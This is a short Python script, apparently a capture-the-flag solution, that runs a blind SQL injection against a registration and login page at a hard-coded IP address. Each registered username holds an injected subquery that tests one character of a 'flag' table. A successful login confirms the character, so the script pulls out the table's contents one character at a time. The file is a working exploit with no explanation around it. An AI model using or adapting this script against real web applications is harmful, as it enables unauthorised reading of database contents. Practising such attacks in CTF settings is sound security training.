import requests
import random
import re
import string

session = requests.session()


def register(username, email, password='test'):
    url = "http://35.220.140.18:8080/register.php"
    data = {"name": username, "password": password, "confirm": password, "email": email, "submit": ''}
    reponse = session.post(url, data=data)


def login(email, password='test'):
    url = "http://35.220.140.18:8080/login.php"
    data = {"email": email, "password": password, "submit": ''}
    reponse1 = session.post(url, data=data)
    url = "http://35.220.140.18:8080/index.php"    
    reponse2 = session.get(url)
    
    pattern = '''<i class="name">(.+?)</i>'''
    try:
        userr = re.findall(pattern, reponse2.text, re.DOTALL)[0]
        # print(reponse2.text)
        # print(userr)
        if userr:
            return True
        else:
            return False
    except:
        return False

def main():
    strings = string.printable;
    flag = ''
    for i in range(1, 255):
        for char in strings:
            username = f"'or(substr((select * from (select (select 1)a union select * from flag)e limit 1, 2) from {i} for 1) = '{char}')-- -"
            # print(username)
            email = f'{int(random.random() * 1000000)}@gmail.com'
            register(username, email)
            if login(email):
                flag += char
                print(flag)
                break
       
if __name__ == "__main__":
    main()